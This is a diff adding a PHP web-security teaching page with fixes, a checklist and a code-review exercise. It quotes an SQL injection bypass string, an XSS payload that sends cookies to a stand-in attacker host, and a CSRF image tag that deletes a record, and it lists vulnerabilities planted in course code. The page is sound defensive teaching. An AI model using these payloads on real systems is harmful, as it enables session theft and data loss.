@@ -1,0 +1,161 @@
+<Goals>
+- How attackers think: every input is a door
+- The five attacks every PHP developer must know: SQL injection, XSS, CSRF, broken access control, brute force
+- How each one is prevented, with examples from the course code and the fitness site
+- Secure sessions, error handling and configuration
+- A checklist to run on every project before you hand it in
+</Goals>
+
+## The mindset
+
+A web application is a public door. Anyone on the internet can send **any** request to it, with any values, without using your forms, your JavaScript or even a browser. Security starts with one assumption:
+
+> **All input is hostile until proven otherwise.**
+
+Input means more than form fields: URL parameters, cookies, uploaded files, HTTP headers, even data you previously stored in your own database (if it originally came from a user).
+
+## 1. SQL injection
+
+**What:** user input becomes part of an SQL command, so the user can change the command.
+
+**Example:** `"SELECT uid FROM users WHERE username='$username' and password='$password'"` (Week 3 `login.php`). Input `' OR '1'='1` bypasses the check.
+
+**Fix:** prepared statements for every query that contains input. Allow-lists for things placeholders cannot handle (table names, sort columns).
+
+<InjectionDemo />
+
+Full explanation in [PHP + MySQL](/wiki/php-mysql#sql-injection).
+
+## 2. Cross-site scripting (XSS)
+
+**What:** user input is printed into a page without escaping, so the browser runs it as HTML or JavaScript.
+
+**Example:** a student is saved with the name `<script>fetch('https://evil.example/?c='+document.cookie)</script>`. The admin opens the student list, which prints names unescaped, and the script sends the admin's cookies to the attacker.
+
+**Fix:**
+
+- Escape **every** value at output: `htmlspecialchars($x, ENT_QUOTES)` (the fitness `h()` helper).
+- Inside JavaScript, use `json_encode()` to insert PHP values, as `setup_2fa.php` does: `renderFCMQRCode(el, <?= json_encode($uri) ?>)`.
+- Mark the session cookie `HttpOnly` so JavaScript cannot read it even if XSS happens.
+
+| Where you print | How to escape |
+| --- | --- |
+| HTML text and attributes | `htmlspecialchars($v, ENT_QUOTES)` |
+| Inside a `<script>` | `json_encode($v)` |
+| Inside a URL parameter | `urlencode($v)` (then `htmlspecialchars` for the HTML around it) |
+
+## 3. Cross-site request forgery (CSRF)
+
+**What:** another website makes *your* browser send a request to *our* site. Your browser attaches your cookies automatically, so the request looks like it came from you.
+
+**Example:** you are logged into the SMW admin. You visit a page that contains `<img src="http://localhost/smw/Admin/Students/delete_student.php?ID_Student=17">`. Your browser loads the "image", which is really a GET request that deletes student 17, with your session.
+
+**Fix, in layers:**
+
+1. **Never change data with GET.** Deletes, updates and logouts are POST forms. The fitness admin's delete buttons are tiny POST forms, not links.
+2. **SameSite cookies.** `session_set_cookie_params(['samesite' => 'Strict'])` tells the browser not to send the session cookie on requests that started on another site. This blocks most CSRF in modern browsers.
+3. **CSRF tokens** (the classic, strongest fix): put a random secret in the session and in every form, and reject POSTs where they do not match.
+
+```php
+// once per session
+$_SESSION['csrf'] ??= bin2hex(random_bytes(32));
+
+// in every form
+<input type="hidden" name="csrf" value="<?= $_SESSION['csrf'] ?>">
+
+// before handling any POST
+if (!hash_equals($_SESSION['csrf'], $_POST['csrf'] ?? '')) { http_response_code(400); exit('Bad request'); }
+```
+
+`hash_equals` compares in constant time so the comparison itself does not leak information. The fitness site relies on layers 1 and 2; adding tokens is a good extension exercise.
+
+## 4. Broken access control
+
+**What:** a page or action checks *whether* you are logged in, or nothing at all, but not *whether you are allowed*.
+
+**Examples in the course code:**
+
+- `update_student.php` has `//include("check.php");` commented out: anyone can edit students.
+- `check.php` redirects without `exit`, so the protected page still runs and its output is sent.
+
+**Fix:**
+
+- Put the guard on the **first line** of every protected page (`require_admin();`), and in every file that *handles* actions, not only in pages that show menus.
+- Always `exit` after a redirect or a 403.
+- Check ownership: a member editing "their" profile must only be able to change *their own* row (`WHERE id = ? AND user_id = ?`), not any ID they type into the URL. Changing `?id=5` to `?id=6` is the first thing attackers try (**IDOR**, insecure direct object reference).
+
+## 5. Brute force and credential stuffing
+
+**What:** a script tries thousands of passwords, or leaked email/password pairs from other sites, or all one million 6-digit 2FA codes.
+
+**Fix:**
+
+- Slow password hashes (`password_hash`).
+- **Lockout or rate limiting.** The fitness site counts consecutive failures per account and locks for 15 minutes after five:
+
+<Source file="Project/fitness_center/config.php" from={78} to={93} />
+
+- 2FA, so a correct password alone is not enough.
+- The same error message for unknown email and wrong password.
+
+<Note title="Trade-off">
+Per-account lockout means an attacker can lock a known user out for 15 minutes on purpose. Large sites combine per-IP limits, growing delays and CAPTCHAs. For a course project, per-account lockout is a sensible, simple choice, and knowing its weakness is part of the lesson.
+</Note>
+
+## Secure sessions
+
+| Setting / habit | Why |
+| --- | --- |
+| `session_regenerate_id(true)` after login | Prevents session fixation |
+| Cookie `HttpOnly` | JavaScript cannot steal it through XSS |
+| Cookie `SameSite=Strict` (or `Lax`) | Blocks most CSRF |
+| Cookie `Secure` + HTTPS in production | The cookie is never sent unencrypted |
+| Full logout (clear, destroy, delete cookie) | No leftover session |
+| Store only IDs and roles in the session, never passwords | Less to lose |
+
+## Errors and configuration
+
+- **Do not show raw errors to users.** `PDOException` messages contain SQL and table names. Log them, show a friendly message. In development `display_errors` on; in production off.
+- **Keep secrets out of code you share.** Database passwords belong in a config file that is not uploaded to GitHub.
+- **Least privilege.** XAMPP's `root` user can do everything to every database. A real deployment uses a database user that can only access its own database.
+- **Uploads:** check the error code, size and real MIME type; never trust the file name; store outside the web root or with a generated name.
+- **Keep software updated.** XAMPP, PHP and libraries get security fixes.
+
+## The pre-submission checklist
+
+Run through this list for every project before you hand it in.
+
+| ✓ | Check |
+| --- | --- |
+| ☐ | Every SQL query with input uses a prepared statement |
+| ☐ | Every printed value goes through `htmlspecialchars` / `h()` |
+| ☐ | Every protected page and action file starts with an auth/role guard |
+| ☐ | Every `header('Location: …')` is followed by `exit` |
+| ☐ | No data changes through GET links |
+| ☐ | Passwords are hashed with `password_hash`, checked with `password_verify` |
+| ☐ | Session ID regenerated after login; logout clears everything |
+| ☐ | Inputs are validated on the server (types, lengths, allowed values) |
+| ☐ | Failed logins are limited |
+| ☐ | Error messages do not reveal SQL, paths or which emails exist |
+| ☐ | Uploads are checked and renamed |
+
+<Exercise title="Security review of the SMW admin">
+Open the SMW admin module (`Learning/SMW_AdminModule`). Find at least five security problems using the checklist above, and for each write the file, the problem and the fix.
+
+<Solution>
+A selection (there are more):
+
+| File | Problem | Fix |
+| --- | --- | --- |
+| `Students/update_student.php` | Guard commented out: anyone can update students | Uncomment / add `include 'check.php';` at the top |
+| `Students/update_student.php`, `addStudent.php` | SQL built by string concatenation | Prepared statements |
+| `Students/delete_student.php` | Deletes via GET, ID used unquoted in SQL (`WHERE ID_Student=$ID_Student`) | POST form + prepared statement (or at least `(int)`) |
+| `Students/adminn.php` | Search results printed without escaping | `htmlspecialchars` on every value |
+| `check.php` | `header()` without `exit` | Add `exit;` |
+| `login.php` / `users` table | Plain-text passwords, SQL injection | `password_hash` / `password_verify` + prepared statement |
+| `addStudent.php` | No check of upload type or error | Validate `$_FILES` |
+| `config.php` | `root` without password | Fine locally; a limited DB user in production |
+
+Doing this kind of review on someone else's code is one of the best ways to learn security, because the patterns become easy to spot in your own.
+</Solution>
+</Exercise>
